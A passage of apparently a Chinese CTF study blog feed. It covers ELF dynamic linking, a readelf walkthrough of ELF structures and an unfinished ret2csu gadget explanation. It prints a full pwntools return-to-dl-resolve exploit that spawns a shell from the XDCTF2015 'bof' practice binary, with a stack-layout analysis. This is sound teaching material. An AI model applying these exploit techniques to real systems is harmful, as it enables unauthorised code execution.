data-src="/2019/07/06/PWN学习之高级ROP/11.JPG" class="lazyload"></p><p>STRTAB[0x4c] = 0x80482c4</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/12.JPG" class="lazyload"></p><p>找到write符号，后面就是系统调用的事了。按<code>n</code>继续执行程序，查看got表中的write函数</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/13.JPG" class="lazyload"></p><p>got表中write函数更新为write的真实地址，以上便是<code>延迟绑定技术</code>。</p><p>如果修改<code>.dynstr</code>中write符号所在地址的值，结果又会如何。下面重新运行程序，将<code>write</code>修改为<code>read</code></p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/14.JPG" class="lazyload"></p><p>按<code>n</code>继续执行程序，查看got表中的write函数</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/15.JPG" class="lazyload"></p><p>成功修改！</p><p>因此我们可以修改<code>.dynstr</code>表来执行我们想要的任意函数，然而<code>.dynstr</code>表不可写。</p><p>加入我们在某一可写地址处写入<code>system</code>，然后伪造<code>.dynsym</code>使STRTAB[st_name]指向<code>system</code>，接着伪造<code>.ret.plt</code>使SYMTAB[r_info&gt;&gt;8 * 0x10]指向伪造的<code>.dynsym</code>，然后想栈顶写入指向伪造<code>.ret.plt</code>的偏移reloc_arg，最后控制eip指向plt[0]，即可执行system函数。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span>   <span class="comment">#控制eip</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only "pop|ret"</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36+align)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>exp分析：</p><p>首先执行read函数：向base_stage中读入100字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：0x08048380</span><br><span class="line">base_stage+8 ：reloc_arg       </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>接着返回到ppp_ret，pop掉三个参数，返回ebp_pop，将base_stage传入ebp，接着返回leave，将ebp中的base_stage传入esp。此时esp指向base_stage，然后pop ebp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：0x08048380  &lt;-esp</span><br><span class="line">base_stage+8 ：reloc_arg </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>返回plt_0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：0x08048380  </span><br><span class="line">base_stage+8 ：reloc_arg   &lt;-esp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>plt_0将link_map入栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：link_map  &lt;-esp</span><br><span class="line">base_stage+8 ：reloc_arg </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>接着调用_dl_runtime_solve()函数，执行system(‘/bin/sh’)。</p><p>参考链接：</p><p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/</a></p><p><a href="https://www.anquanke.com/post/id/177450" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177450</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用readelf详解elf</title>
      <link href="/2019/07/05/%E5%88%A9%E7%94%A8readelf%E8%AF%A6%E8%A7%A3elf/"/>
      <url>/2019/07/05/%E5%88%A9%E7%94%A8readelf%E8%AF%A6%E8%A7%A3elf/</url>
      
        <content type="html"><![CDATA[<h3 id="查看readelf选项"><a href="#查看readelf选项" class="headerlink" title="查看readelf选项"></a>查看readelf选项</h3><p>readelf -h</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Options are:</span><br><span class="line">  -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I</span><br><span class="line">  -h --file-header       Display the ELF file header</span><br><span class="line">  -l --program-headers   Display the program headers</span><br><span class="line">     --segments          An alias for --program-headers</span><br><span class="line">  -S --section-headers   Display the sections&apos; header</span><br><span class="line">     --sections          An alias for --section-headers</span><br><span class="line">  -g --section-groups    Display the section groups</span><br><span class="line">  -t --section-details   Display the section details</span><br><span class="line">  -e --headers           Equivalent to: -h -l -S</span><br><span class="line">  -s --syms              Display the symbol table</span><br><span class="line">     --symbols           An alias for --syms</span><br><span class="line">  --dyn-syms             Display the dynamic symbol table</span><br><span class="line">  -n --notes             Display the core notes (if present)</span><br><span class="line">  -r --relocs            Display the relocations (if present)</span><br><span class="line">  -u --unwind            Display the unwind info (if present)</span><br><span class="line">  -d --dynamic           Display the dynamic section (if present)</span><br><span class="line">  -V --version-info      Display the version sections (if present)</span><br><span class="line">  -A --arch-specific     Display architecture specific information (if any)</span><br><span class="line">  -c --archive-index     Display the symbol/file index in an archive</span><br><span class="line">  -D --use-dynamic       Use the dynamic section info when displaying symbols</span><br><span class="line">  -x --hex-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as bytes</span><br><span class="line">  -p --string-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as strings</span><br><span class="line">  -R --relocated-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as relocated bytes</span><br><span class="line">  -z --decompress        Decompress section before dumping it</span><br><span class="line">  -w[lLiaprmfFsoRtUuTgAckK] or</span><br><span class="line">  --debug-dump[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,</span><br><span class="line">               =frames-interp,=str,=loc,=Ranges,=pubtypes,</span><br><span class="line">               =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,</span><br><span class="line">               =addr,=cu_index,=links,=follow-links]</span><br><span class="line">                         Display the contents of DWARF debug sections</span><br><span class="line">  --dwarf-depth=N        Do not display DIEs at depth N or greater</span><br><span class="line">  --dwarf-start=N        Display DIEs starting with N, at the same depth</span><br><span class="line">                         or deeper</span><br><span class="line">  -I --histogram         Display histogram of bucket list lengths</span><br><span class="line">  -W --wide              Allow output width to exceed 80 characters</span><br><span class="line">  @&lt;file&gt;                Read options from &lt;file&gt;</span><br><span class="line">  -H --help              Display this information</span><br><span class="line">  -v --version           Display the version number of readelf</span><br></pre></td></tr></table></figure><p>下面根据选项参数来一个一个解析,以32位为例，64位类似。</p><h3 id="ELF文件头"><a href="#ELF文件头" class="headerlink" title="ELF文件头"></a>ELF文件头</h3><p>readelf -h filename</p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/1.JPG" class="lazyload"></p><p>ELF header数据结构如下（52字节）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#define EI_NIDENT   16</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    unsigned char   e_ident[EI_NIDENT];    ##magic魔数</span><br><span class="line">    ELF32_Half      e_type;                ##类别</span><br><span class="line">    ELF32_Half      e_machine;             ##系统架构：3(Intel 80386)</span><br><span class="line">    ELF32_Word      e_version;             ##版本：2(可执行文件)</span><br><span class="line">    ELF32_Addr      e_entry;               ##入口点地址</span><br><span class="line">    ELF32_Off       e_phoff;               ##程序头部表</span><br><span class="line">    ELF32_Off       e_shoff;               ##节区头部表</span><br><span class="line">    ELF32_Word      e_flags;               ##标志</span><br><span class="line">    ELF32_Half      e_ehsize;              ##本头的大小</span><br><span class="line">    ELF32_Half      e_phentsize;           ##程序头大小</span><br><span class="line">    ELF32_Half      e_phnum;               ##程序头数量</span><br><span class="line">    ELF32_Half      e_shentsize;           ##节头大小</span><br><span class="line">    ELF32_Half      e_shnum;               ##节头数量</span><br><span class="line">    ELF32_Half      e_shstrndx;            ##字符串表索引节头</span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>其中数据类型介绍如下：</p><table><thead><tr><th>名称</th><th>长度</th><th>对齐方式</th><th>用途</th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td>无符号半整型</td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>4</td><td>有符号大整型</td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td>无符号大整型</td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td>无符号小整型</td></tr></tbody></table><p>magic介绍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">前四字节：\x7F、&apos;E&apos;、&apos;L&apos;、&apos;F&apos;  文件标识</span><br><span class="line">第五字节：文件类别，0(无效类型)、1(32位)、2(64位)</span><br><span class="line">第六字节：数据编码，0(无效编码)、1(小端)、2(大端)</span><br><span class="line">第七字节：文件版本，1(当前版本)</span><br><span class="line">第八字节：补齐字节开始处</span><br><span class="line">之后魔数：留用</span><br></pre></td></tr></table></figure><h3 id="程序头部表"><a href="#程序头部表" class="headerlink" title="程序头部表"></a>程序头部表</h3><p>readelf -l filename</p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/3.JPG" class="lazyload"></p><p>程序头数据结构如下（32字节）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word  p_type;</span><br><span class="line">    ELF32_Off   p_offset;</span><br><span class="line">    ELF32_Addr  p_vaddr;</span><br><span class="line">    ELF32_Addr  p_paddr;</span><br><span class="line">    ELF32_Word  p_filesz;</span><br><span class="line">    ELF32_Word  p_memsz;</span><br><span class="line">    ELF32_Word  p_flags;</span><br><span class="line">    ELF32_Word  p_align;</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><h3 id="节区头部表"><a href="#节区头部表" class="headerlink" title="节区头部表"></a>节区头部表</h3><p>readelf -S filename</p><p>该结构用于定位 ELF 文件中的每个节区的具体位置。</p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/4.JPG" class="lazyload"></p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/5.JPG" class="lazyload"></p><p>节区头数据结构如下（40字节）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word sh_name;      ## 节头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;      ## 节类型</span><br><span class="line">    Elf32_Word sh_flags;     ## 节标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;      ## 节的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;    ## 节的文件偏移</span><br><span class="line">    Elf32_Word sh_size;      ## 节的长度</span><br><span class="line">    Elf32_Word sh_link;      ## 节头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;      ## 附加信息</span><br><span class="line">    Elf32_Word sh_addralign; ## 节对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;   ## 固定大小的节表项的长度</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>下面看看几个重要的节</p><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><p>readelf -s filename</p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/8.JPG" class="lazyload"></p><p>其数据结构如下（16字节）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    Elf32_Word st_name;     // Symbol name(string tbl index)</span><br><span class="line">    Elf32_Addr st_value;    // Symbol value</span><br><span class="line">    Elf32_Word st_size;     // Symbol size</span><br><span class="line">    unsigned char st_info;  // Symbol type and binding</span><br><span class="line">    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2</span><br><span class="line">    Elf32_Half st_shndx;    // Section index</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><h3 id="rel-plt和-rel-dyn"><a href="#rel-plt和-rel-dyn" class="headerlink" title=".rel.plt和.rel.dyn"></a>.rel.plt和.rel.dyn</h3><p>readelf -r filename</p><p><code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/7.JPG" class="lazyload"></p><p>对应数据结构如下（8字节）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址</span><br><span class="line">    Elf32_Word r_info;      // 符号表索引</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>readelf -d filename</p><p>动态链接的ELF文件的动态符号表</p><p><img alt="" data-src="/2019/07/05/利用readelf详解elf/F:/blog/Hexo/source/_posts/%E5%88%A9%E7%94%A8readelf%E8%AF%A6%E8%A7%A3elf/6.JPG" class="lazyload"></p><p>其中Tag对应着每个节。比如<code>JMPREL</code>对应着<code>.rel.plt</code></p><p>其数据结构如下（12字节）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>PWN学习之中级ROP</title>
      <link href="/2019/07/02/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%B8%AD%E7%BA%A7ROP/"/>
      <url>/2019/07/02/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%B8%AD%E7%BA%A7ROP/</url>
      
        <content type="html"><![CDATA[<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>详细分析参见ctf-wiki</p><p>64位程序传参规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中</span><br><span class="line">数超过六个时，从第七个开始压入栈中</span><br></pre></td></tr></table></figure><p>__libc_csu_init函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:0000000000400650                 push    r15</span><br><span class="line">.text:0000000000400652                 mov     r15d, edi</span><br><span class="line">.text:0000000000400655                 push    r14</span><br><span class="line">.text:0000000000400657                 mov     r14, rsi</span><br><span class="line">.text:000000000040065A                 push    r13</span><br><span class="line">.text:000000000040065C                 mov     r13, rdx</span><br><span class="line">.text:000000000040065F                 push    r12</span><br><span class="line">.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400668                 push    rbp</span><br><span class="line">.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000400670                 push    rbx</span><br><span class="line">.text:0000000000400671                 sub     rbp, r12</span><br><span class="line">.text:0000000000400674                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400676                 sar     rbp, 3</span><br><span class="line">.text:000000000040067A                 sub     rsp, 8</span><br><span class="line">.text:000000000040067E                 call    _init_proc</span><br><span class="line">.text:0000000000400683                 test    rbp, rbp</span><br><span class="line">.text:0000000000400686                 jz      short loc_4006A6</span><br><span class="line">.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400690</span><br><span class="line">.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400690                 mov     rdx, r13</span><br><span class="line">.text:0000000000400693                 mov     rsi, r14</span><br><span class="line">.text:0000000000400696                 mov     edi, r15d</span><br><span class="line">.text:0000000000400699                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040069D                 add     rbx, 1</span><br><span class="line">.text:00000000004006A1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004006A4                 jnz     short loc_400690</span><br><span class="line">.text:00000000004006A6</span><br><span class="line">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j</span><br><span class="line">.text:00000000004006A6                 add     rsp, 8</span><br><span class="line">.text:00000000004006AA                 pop     rbx</span><br><span class="line">.text:00000000004006AB                 pop     rbp</span><br><span class="line">.text:00000000004006AC                 pop     r12</span><br><span class="line">.text:00000000004006AE                 pop     r13</span><br><span class="line">.text:00000000004006B0                 pop     r14</span><br><span class="line">.text:00000000004006B2                 pop     r15</span><br><span class="line">.text:00000000004006B4                 retn</span><br><span class="line">.text:00000000004006B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>这里我们可以利用以下几点</p><ul><li>从 0x00000000004006AA 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li><li>从 0x0000000000400690 到 0x0000000000400699，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制  rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制  r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为  rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置  rbx=0，rbp=1。</li></ul><p>从0x4006AA到结尾，中间还有可以利用的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5i 0x00000000004006AA</span><br><span class="line">=&gt; 0x4006aa &lt;__libc_csu_init+90&gt;:pop    rbx</span><br><span class="line">   0x4006ab &lt;__libc_csu_init+91&gt;:pop    rbp</span><br><span class="line">   0x4006ac &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x4006ae &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x4006b0 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">gdb-peda$ x/5i 0x00000000004006AA+3</span><br><span class="line">   0x4006ad &lt;__libc_csu_init+93&gt;:pop    rsp  ##rsp</span><br><span class="line">   0x4006ae &lt;__libc_csu_init+94&gt;:pop    r13  </span><br><span class="line">   0x4006b0 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x4006b2 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x4006b4 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">gdb-peda$ x/5i 0x00000000004006AA+5</span><br><span class="line">   0x4006af &lt;__libc_csu_init+95&gt;:pop    rbp  ##rbp</span><br><span class="line">   0x4006b0 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x4006b2 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x4006b4 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x4006b5:data16 nop WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gdb-peda$ x/5i 0x00000000004006AA+7</span><br><span class="line">   0x4006b1 &lt;__libc_csu_init+97&gt;:pop    